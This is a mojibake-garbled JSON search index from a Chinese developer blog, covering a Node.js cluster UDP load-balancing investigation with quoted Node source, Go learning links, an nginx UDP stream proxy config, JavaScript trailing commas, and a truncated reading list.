ç„¶åè§‚å¯Ÿserverçš„æ—¥å¿—å‘ç°ï¼š\nåŸºæœ¬ä¸Šæ‰€æœ‰çš„æ¶ˆæ¯éƒ½è¢«æœ€åä¸€ä¸ªè¿›ç¨‹æ¶ˆè´¹ pid 98798 æ¶ˆè´¹ä¸€ä¸ªæ¶ˆæ¯ å…¶ä»–è¿›ç¨‹æ²¡æœ‰æ¶ˆè´¹æ¶ˆæ¯ {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601201509,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: adf\\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601202172,\u0026#34;pid\u0026#34;:98798,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98798 udp server got: asdflasdf\\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601202382,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601202545,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601202678,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601202832,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601203332,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601203420,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601203500,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601203609,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601203669,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601203752,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601203836,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601203920,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204004,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204089,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204172,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204256,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204340,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204423,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204507,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204590,\u0026#34;pid\u0026#34;:98798,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98798 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204674,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204759,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204842,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601204926,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601205010,\u0026#34;pid\u0026#34;:98798,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98798 udp server got: \\n from 127.0.0.1:53080\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601205093,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;98796 udp server got: \\n from 127.0.0.1:53080\u0026#34;} ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿçœ‹çœ‹clusteræ¨¡å—çš„ä»£ç  lib/cluster.js lib/cluster.js clusteré™¤å»æ³¨é‡Šï¼Œä»£ç ä»…æœ‰ä¸¤è¡Œ \u0026#39;use strict\u0026#39;; // æ ¹æ®ç¯å¢ƒå˜é‡ä¸­æ˜¯å¦æœ‰NODE_UNIQUE_IDæ¥åˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯ä¸»è¿›ç¨‹è¿˜æ˜¯å­è¿›ç¨‹ const childOrPrimary = \u0026#39;NODE_UNIQUE_ID\u0026#39; in process.env ? \u0026#39;child\u0026#39; : \u0026#39;primary\u0026#39;; // æ ¹æ®è¿›ç¨‹ç±»å‹ä¸åŒï¼ŒåŠ è½½çš„æ–‡ä»¶ä¹Ÿä¸åŒ // å¯¹äºä¸»è¿›ç¨‹ï¼Œåˆ™åŠ è½½ internal/cluster/primary // å¯¹äºè‡ªè¿›ç¨‹ï¼Œåˆ™åŠ è½½ internal/cluster/child module.exports = require(`internal/cluster/${childOrPrimary}`); internal/cluster/primary.js è½®è¯¢ç­–ç•¥çš„ç§ç±» é€šè¿‡é˜…è¯»æºç ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°ä»¥ä¸‹ç»“è®ºï¼š\nclusteræ¨¡å—å®é™…ä¸Šæ˜¯ä¸€ä¸ªäº‹ä»¶å‘å°„å™¨ clusteræ¨¡å—æœ‰ä¸¤ç§è´Ÿè½½å‡è¡¡æ–¹å¼ SCHED_NONE ç”±æ“ä½œç³»ç»Ÿå†³å®š SCHED_RR è½®è¯¢çš„æ–¹å¼ const { ArrayPrototypePush, ArrayPrototypeSlice, ArrayPrototypeSome, ObjectKeys, ObjectValues, RegExpPrototypeTest, SafeMap, StringPrototypeStartsWith, } = primordials; const assert = require(\u0026#39;internal/assert\u0026#39;); const { fork } = require(\u0026#39;child_process\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const EventEmitter = require(\u0026#39;events\u0026#39;); const RoundRobinHandle = require(\u0026#39;internal/cluster/round_robin_handle\u0026#39;); const SharedHandle = require(\u0026#39;internal/cluster/shared_handle\u0026#39;); const Worker = require(\u0026#39;internal/cluster/worker\u0026#39;); const { internal, sendHelper } = require(\u0026#39;internal/cluster/utils\u0026#39;); const cluster = new EventEmitter(); const intercom = new EventEmitter(); const SCHED_NONE = 1; const SCHED_RR = 2; const minPort = 1024; const maxPort = 65535; const { validatePort } = require(\u0026#39;internal/validators\u0026#39;); module.exports = cluster; const handles = new SafeMap(); cluster.isWorker = false; cluster.isMaster = true; // Deprecated alias. Must be same as isPrimary. cluster.isPrimary = true; cluster.Worker = Worker; cluster.workers = {}; cluster.settings = {}; cluster.SCHED_NONE = SCHED_NONE; // Leave it to the operating system. cluster.SCHED_RR = SCHED_RR; // Primary distributes connections. è½®è¯¢ç­–ç•¥å¦‚ä½•é€‰æ‹© æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±è¦å†çœ‹çœ‹ï¼Œä¸¤ç§ä¸åŒçš„è´Ÿè½½ç­–ç•¥æ˜¯å¦‚ä½•é€‰æ‹©çš„ï¼Ÿ\nè´Ÿè½½ç­–ç•¥åˆšå¼€å§‹æ¥è‡ªNODE_CLUSTER_SCHED_POLICYè¿™ä¸ªç¯å¢ƒå˜é‡ è¿™ä¸ªç¯å¢ƒå˜é‡æœ‰ä¸¤ä¸ªå€¼ rrå’Œnone ä½†æ˜¯å¦‚æœç³»ç»Ÿå¹³å°æ˜¯win32, ä¹Ÿå°±æ˜¯windowsçš„æƒ…å†µä¸‹ï¼Œåˆ™ä¸ä¼šä½¿ç”¨è½®è®­çš„è´Ÿè½½æ–¹å¼ é™¤æ­¤ä»¥å¤–ï¼Œé»˜è®¤å°†ä¼šä½¿ç”¨è½®è®­çš„è´Ÿè½½æ–¹å¼ // XXX(bnoordhuis) Fold cluster.schedulingPolicy into cluster.settings? let schedulingPolicy = process.env.NODE_CLUSTER_SCHED_POLICY; if (schedulingPolicy === \u0026#39;rr\u0026#39;) schedulingPolicy = SCHED_RR; else if (schedulingPolicy === \u0026#39;none\u0026#39;) schedulingPolicy = SCHED_NONE; else if (process.platform === \u0026#39;win32\u0026#39;) { // Round-robin doesn\u0026#39;t perform well on // Windows due to the way IOCP is wired up. schedulingPolicy = SCHED_NONE; } else schedulingPolicy = SCHED_RR; cluster.schedulingPolicy = schedulingPolicy; é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆudpçš„å¤šè¿›ç¨‹æœåŠ¡å™¨ï¼Œå¹¶æ²¡æœ‰åšåˆ°è½®è¯¢çš„è´Ÿè½½å‘¢ï¼Ÿ\nè½®è¯¢ç­–ç•¥çš„ä½¿ç”¨ å³ä½¿è°ƒç”¨ç­–ç•¥æ˜¯è½®è¯¢çš„æ–¹å¼ï¼Œå¦‚æœsockeræ˜¯udpçš„ï¼Œä¹Ÿä¸ä¼šç”¨è½®è®­çš„æ–¹å¼å»å¤„ç†ï¼Œè€Œç”¨SharedHandleå»å¤„ç† æ³¨é‡Šé‡Œé¢å†™ï¼Œudpä½¿ç”¨è½®è¯¢çš„æ–¹å¼æ˜¯æ— æ„ä¹‰çš„ï¼Œè¿™ç‚¹æˆ‘ä¸å¤ªç†è§£ // UDP is exempt from round-robin connection balancing for what should // be obvious reasons: it\u0026#39;s connectionless. There is nothing to send to // the workers except raw datagrams and that\u0026#39;s pointless. if (schedulingPolicy !== SCHED_RR || message.addressType === \u0026#39;udp4\u0026#39; || message.addressType === \u0026#39;udp6\u0026#39;) { handle = new SharedHandle(key, address, message); } else { handle = new RoundRobinHandle(key, address, message); } ","permalink":"https://wdd.js.org/posts/2021/07/tniabf/","summary":"æœ¬æ¥æˆ‘çš„ç›®çš„æ˜¯ä½¿ç”¨clusteræ¨¡å—çš„forkå‡ºå¤šä¸ªè¿›ç¨‹ï¼Œè®©å„ä¸ªè¿›ç¨‹éƒ½èƒ½å¤„ç†udpæ¶ˆæ¯çš„ã€‚ä½†æ˜¯æœ€ç»ˆæµ‹è¯•å‘ç°ï¼Œå®é™…ä¸Šä»…æœ‰ä¸€ä¸ªè¿›ç¨‹å¤„ç†äº†ç»å¤§æ•°æ¶ˆæ¯ï¼Œå…¶ä»–çš„è¿›ç¨‹ï¼Œè¦ä¹ˆä¸å¤„ç†æ¶ˆæ¯ï¼Œè¦ä¹ˆå¤„ç†çš„éå¸¸å°‘çš„æ¶ˆæ¯ã€‚\nç„¶è€Œä½¿ç”¨clusteræ¥å¼€å¯httpæœåŠ¡çš„å¤šè¿›ç¨‹ï¼Œå´èƒ½å¤Ÿè¾¾åˆ°å¤šè¿›ç¨‹çš„è´Ÿè½½ã€‚\nserverç«¯demoä»£ç ï¼š const cluster = require(\u0026#39;cluster\u0026#39;) const numCPUs = require(\u0026#39;os\u0026#39;).cpus().length const { logger } = require(\u0026#39;./logger\u0026#39;) const dgram = require(\u0026#39;dgram\u0026#39;) // const { createHTTPServer, createUDPServer } = require(\u0026#39;./app\u0026#39;) const port = 8088 if (cluster.isMaster) { for (let i = 0; i \u0026lt; numCPUs; i++) { cluster.fork() } cluster.on(\u0026#39;exit\u0026#39;, (worker, code, signal) =\u0026gt; { logger.info(`å·¥ä½œè¿›ç¨‹ ${worker.process.pid} å·²é€€å‡º`) }) } else { const server = dgram.createSocket({ type: \u0026#39;udp4\u0026#39;, reuseAddr: true }) server.","title":"udp cluster å¤šè¿›ç¨‹è°ƒåº¦ç­–ç•¥å­¦ä¹ "},{"content":"åœ¨çº¿ä¹¦ç± ã€ŠGoè¯­è¨€åŸæœ¬ã€‹https://golang.design/under-the-hood/ ã€ŠGolangä¿®å…»ä¹‹è·¯ã€‹https://www.kancloud.cn/aceld/golang ã€ŠGoè¯­è¨€é«˜æ€§èƒ½ç¼–ç¨‹ã€‹https://geektutu.com/post/high-performance-go.html ã€Š7å¤©ç”¨Goä»é›¶å®ç°Webæ¡†æ¶Geeæ•™ç¨‹ã€‹https://geektutu.com/post/gee.html åšå®¢å…³æ³¨ https://carlosbecker.com/ https://www.alexedwards.net/blog https://gobyexample.com/ æ–‡ç« æ”¶è— https://carlosbecker.com/posts/env-structs-golang https://www.alexedwards.net/blog/json-surprises-and-gotchas https://www.alexedwards.net/blog/how-to-manage-database-timeouts-and-cancellations-in-go https://www.alexedwards.net/blog/custom-command-line-flags https://www.alexedwards.net/blog/how-to-properly-parse-a-json-request-body https://www.alexedwards.net/blog/working-with-redis https://www.alexedwards.net/blog/organising-database-access https://www.alexedwards.net/blog/interfaces-explained ","permalink":"https://wdd.js.org/golang/learn-material/","summary":"åœ¨çº¿ä¹¦ç± ã€ŠGoè¯­è¨€åŸæœ¬ã€‹https://golang.design/under-the-hood/ ã€ŠGolangä¿®å…»ä¹‹è·¯ã€‹https://www.kancloud.cn/aceld/golang ã€ŠGoè¯­è¨€é«˜æ€§èƒ½ç¼–ç¨‹ã€‹https://geektutu.com/post/high-performance-go.html ã€Š7å¤©ç”¨Goä»é›¶å®ç°Webæ¡†æ¶Geeæ•™ç¨‹ã€‹https://geektutu.com/post/gee.html åšå®¢å…³æ³¨ https://carlosbecker.com/ https://www.alexedwards.net/blog https://gobyexample.com/ æ–‡ç« æ”¶è— https://carlosbecker.com/posts/env-structs-golang https://www.alexedwards.net/blog/json-surprises-and-gotchas https://www.alexedwards.net/blog/how-to-manage-database-timeouts-and-cancellations-in-go https://www.alexedwards.net/blog/custom-command-line-flags https://www.alexedwards.net/blog/how-to-properly-parse-a-json-request-body https://www.alexedwards.net/blog/working-with-redis https://www.alexedwards.net/blog/organising-database-access https://www.alexedwards.net/blog/interfaces-explained ","title":"Golangå­¦ä¹ èµ„æ–™"},{"content":"å¯¹nginxçš„æœ€ä½ç‰ˆæœ¬è¦æ±‚æ˜¯ï¼Ÿ 1.9.13 The ngx_stream_proxy_module module (1.9.0) allows proxying data streams over TCP, UDP (1.9.13), and UNIX-domain sockets.\nç®€å•çš„é…ç½®æ˜¯ä»€ä¹ˆæ ·ï¼Ÿ ä¾‹å¦‚ç›‘å¬æœ¬åœ°53çš„udpç«¯å£ï¼Œç„¶åè½¬å‘åˆ°192.168.136.130å’Œ192.168.136.131çš„53ç«¯å£\næ³¨æ„äº‹é¡¹\nstreamæ˜¯é¡¶å±‚çš„é…ç½®ï¼Œä¸èƒ½åŒ…å«åœ¨httpæ¨¡å—é‡Œé¢ proxy_responseså¾ˆé‡è¦ï¼Œå¦‚æœä½ çš„udpæœåŠ¡åªæ¥å—udpæ¶ˆæ¯ï¼Œå¹¶ä¸å‘é€udpæ¶ˆæ¯ï¼Œé‚£ä¹ˆåŠ¡å¿…å°†proxy_responsesçš„å€¼è®¾ç½®ä¸º0 stream { upstream dns_upstreams { server 192.168.136.130:53; server 192.168.136.131:53; } server { listen 53 udp; proxy_pass dns_upstreams; proxy_timeout 1s; proxy_responses 0; error_log logs/dns.log; } } | Syntax: | proxy_responses number;\nDefault: â€” Context: stream, server |\nThis directive appeared in version 1.9.13.\nSets the number of datagrams expected from the proxied server in response to a client datagram if the UDP protocol is used. The number serves as a hint for session termination. By default, the number of datagrams is not limited. If zero value is specified, no response is expected. However, if a response is received and the session is still not finished, the response will be handled.\næˆ‘èƒ½ç”¨HAProxyå—ï¼Ÿ ç­”ï¼š HAProxyä¸æ”¯æŒudp Proxyï¼Œä½ ä¸èƒ½ç”¨\nHAProxy is a free, very fast and reliable solution offering high availability, load balancing, and proxying for TCP and HTTP-based applications\nå‚è€ƒ http://nginx.org/en/docs/stream/ngx_stream_proxy_module.html#proxy_responses https://stackoverflow.com/questions/31255780/udp-traffic-with-iperf-for-haproxy ","permalink":"https://wdd.js.org/posts/2021/07/tom7mv/","summary":"å¯¹nginxçš„æœ€ä½ç‰ˆæœ¬è¦æ±‚æ˜¯ï¼Ÿ 1.9.13 The ngx_stream_proxy_module module (1.9.0) allows proxying data streams over TCP, UDP (1.9.13), and UNIX-domain sockets.\nç®€å•çš„é…ç½®æ˜¯ä»€ä¹ˆæ ·ï¼Ÿ ä¾‹å¦‚ç›‘å¬æœ¬åœ°53çš„udpç«¯å£ï¼Œç„¶åè½¬å‘åˆ°192.168.136.130å’Œ192.168.136.131çš„53ç«¯å£\næ³¨æ„äº‹é¡¹\nstreamæ˜¯é¡¶å±‚çš„é…ç½®ï¼Œä¸èƒ½åŒ…å«åœ¨httpæ¨¡å—é‡Œé¢ proxy_responseså¾ˆé‡è¦ï¼Œå¦‚æœä½ çš„udpæœåŠ¡åªæ¥å—udpæ¶ˆæ¯ï¼Œå¹¶ä¸å‘é€udpæ¶ˆæ¯ï¼Œé‚£ä¹ˆåŠ¡å¿…å°†proxy_responsesçš„å€¼è®¾ç½®ä¸º0 stream { upstream dns_upstreams { server 192.168.136.130:53; server 192.168.136.131:53; } server { listen 53 udp; proxy_pass dns_upstreams; proxy_timeout 1s; proxy_responses 0; error_log logs/dns.log; } } | Syntax: | proxy_responses number;\nDefault: â€” Context: stream, server |\nThis directive appeared in version 1.9.13.\nSets the number of datagrams expected from the proxied server in response to a client datagram if the UDP protocol is used.","title":"ä½¿ç”¨nginxä¸ºudpæœåŠ¡è´Ÿè½½å‡è¡¡"},{"content":"ç®€ä»‹ çœ‹ä¸‹é¢çš„ä»£ç ï¼Œå¦‚æœæˆ‘ä»¬è¦æ–°å¢åŠ ä¸€è¡Œ\u0026quot;ccc\u0026quot;, å®é™…æˆ‘ä»¬çš„ç›®çš„æ˜¯å¢åŠ ä¸€è¡Œï¼Œä½†æ˜¯å¯¹äºåƒgitè¿™ç§ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ¥è¯´ï¼Œæˆ‘ä»¬æ”¹åŠ¨äº†ä¸¤è¡Œã€‚\nç¬¬ä¸‰è¡Œè¿›è¡Œäº†ä¿®æ”¹ ç¬¬å››è¡Œå¢åŠ äº† æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦æ”¹åŠ¨ä¸¤è¡Œå‘¢ï¼Ÿå› ä¸ºå¦‚æœä¸åœ¨ç¬¬ä¸‰è¡Œä¸Šçš„æœ«å°¾åŠ ä¸Šé€—å·å°±å¢åŠ ç¬¬å››è¡Œï¼Œåˆ™ä¼šæŠ¥é”™è¯­æ³•é”™è¯¯ã€‚\nvar names = [ \u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34; ] var names = [ \u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34;, \u0026#34;ccc\u0026#34; ] å°¾é€—å·çš„ææ¡ˆå°±æ˜¯å…è®¸å†ä¸€äº›åœºæ™¯ä¸‹ï¼Œå…è®¸å†å°¾éƒ¨å¢åŠ é€—å·ã€‚\nvar name = [ \u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34;, ] é‚£ä¹ˆæˆ‘ä»¬å†æ–°å¢åŠ ä¸€è¡Œçš„æƒ…å†µä¸‹ï¼Œåˆ™åªéœ€è¦å¢åŠ ä¸€è¡Œï¼Œè€Œä¸éœ€è¦ä¿®æ”¹ä¹‹å‰è¡Œçš„ä»£ç ã€‚\nvar name = [ \u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34;, \u0026#34;ccc\u0026#34;, ] å…¼å®¹æ€§ é™¤äº†IEæµè§ˆå™¨æ²¡æœ‰å¯¹å°¾é€—å·å…¨é¢æ”¯æŒä»¥å¤–ï¼Œå…¶ä»–æµè§ˆå™¨ä»¥åŠNodeç¯å¢ƒéƒ½å·²ç»å…¨æ»¡æ”¯æŒ JSONæ˜¯ä¸æ”¯æŒå°¾é€—å·çš„ï¼Œå°¾é€—å·åªèƒ½åœ¨ä»£ç é‡Œé¢ç”¨ æ³¨æ„åœ¨åŒ…å«å°¾é€—å·æ—¶æ•°ç»„é•¿åº¦çš„è®¡ç®— [,,,].length // 3 [,,,1].length // 4 [,,,1,].length // 4 [1,,,].lenght // 3 ä½¿ç”¨åœºæ™¯ æ•°ç»„ä¸­ä½¿ç”¨ var abc = [ 1, 2, 3, ] å¯¹è±¡å­—é¢é‡ä¸­ä½¿ç”¨ var info = { name: \u0026#34;li\u0026#34;, age: 12, } ä½œä¸ºå½¢å‚ä½¿ç”¨ function say ( name, age, ) { } ä½œä¸ºå®å‚ä½¿ç”¨ say( \u0026#34;li\u0026#34;, 12, ) åœ¨importä¸­ä½¿ç”¨ import { A, B, C, } from \u0026#39;D\u0026#39; å‚è€ƒ https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Trailing_commas ","permalink":"https://wdd.js.org/fe/js-trailing-commas/","summary":"ç®€ä»‹ çœ‹ä¸‹é¢çš„ä»£ç ï¼Œå¦‚æœæˆ‘ä»¬è¦æ–°å¢åŠ ä¸€è¡Œ\u0026quot;ccc\u0026quot;, å®é™…æˆ‘ä»¬çš„ç›®çš„æ˜¯å¢åŠ ä¸€è¡Œï¼Œä½†æ˜¯å¯¹äºåƒgitè¿™ç§ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ¥è¯´ï¼Œæˆ‘ä»¬æ”¹åŠ¨äº†ä¸¤è¡Œã€‚\nç¬¬ä¸‰è¡Œè¿›è¡Œäº†ä¿®æ”¹ ç¬¬å››è¡Œå¢åŠ äº† æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦æ”¹åŠ¨ä¸¤è¡Œå‘¢ï¼Ÿå› ä¸ºå¦‚æœä¸åœ¨ç¬¬ä¸‰è¡Œä¸Šçš„æœ«å°¾åŠ ä¸Šé€—å·å°±å¢åŠ ç¬¬å››è¡Œï¼Œåˆ™ä¼šæŠ¥é”™è¯­æ³•é”™è¯¯ã€‚\nvar names = [ \u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34; ] var names = [ \u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34;, \u0026#34;ccc\u0026#34; ] å°¾é€—å·çš„ææ¡ˆå°±æ˜¯å…è®¸å†ä¸€äº›åœºæ™¯ä¸‹ï¼Œå…è®¸å†å°¾éƒ¨å¢åŠ é€—å·ã€‚\nvar name = [ \u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34;, ] é‚£ä¹ˆæˆ‘ä»¬å†æ–°å¢åŠ ä¸€è¡Œçš„æƒ…å†µä¸‹ï¼Œåˆ™åªéœ€è¦å¢åŠ ä¸€è¡Œï¼Œè€Œä¸éœ€è¦ä¿®æ”¹ä¹‹å‰è¡Œçš„ä»£ç ã€‚\nvar name = [ \u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34;, \u0026#34;ccc\u0026#34;, ] å…¼å®¹æ€§ é™¤äº†IEæµè§ˆå™¨æ²¡æœ‰å¯¹å°¾é€—å·å…¨é¢æ”¯æŒä»¥å¤–ï¼Œå…¶ä»–æµè§ˆå™¨ä»¥åŠNodeç¯å¢ƒéƒ½å·²ç»å…¨æ»¡æ”¯æŒ JSONæ˜¯ä¸æ”¯æŒå°¾é€—å·çš„ï¼Œå°¾é€—å·åªèƒ½åœ¨ä»£ç é‡Œé¢ç”¨ æ³¨æ„åœ¨åŒ…å«å°¾é€—å·æ—¶æ•°ç»„é•¿åº¦çš„è®¡ç®— [,,,].length // 3 [,,,1].length // 4 [,,,1,].length // 4 [1,,,].lenght // 3 ä½¿ç”¨åœºæ™¯ æ•°ç»„ä¸­ä½¿ç”¨ var abc = [ 1, 2, 3, ] å¯¹è±¡å­—é¢é‡ä¸­ä½¿ç”¨ var info = { name: \u0026#34;li\u0026#34;, age: 12, } ä½œä¸ºå½¢å‚ä½¿ç”¨ function say ( name, age, ) { } ä½œä¸ºå®å‚ä½¿ç”¨ say( \u0026#34;li\u0026#34;, 12, ) åœ¨importä¸­ä½¿ç”¨ import { A, B, C, } from \u0026#39;D\u0026#39; å‚è€ƒ https://developer.","title":"Js Trailing Commas"},{"content":"6æœˆä¹¦å•å›é¡¾ ã€Šé³—é±¼çš„æ—…è¡Œã€‹åˆšè¯»åˆ°92% ã€ŠGooglerè½¯ä»¶æµ‹è¯•ä¹‹é“ã€‹100% ã€Šè½¯ä»¶æµ‹è¯•ä¹‹é“å¾®è½¯æŠ€æœ¯ä¸“å®¶ç»éªŒæ€»ç»“ã€‹24% ã€Šæ²‰é»˜çš„ç—…äººã€‹100% ã€Šä¸€ä¸ªäººçš„æœåœ£ã€‹9% ã€Šè¯»æ‡‚å‘ç¥¨ã€‹100% ã€Š108ä¸ªè®­ç»ƒè®©ä½ æˆä¸ºæ‰‹æœºæ‘„å½±è¾¾äººã€‹100% ã€Šç»æµå­¦é€šè¯†è¯¾ã€‹5% ã€Šæ¥šç•™é¦™æ–°ä¼ 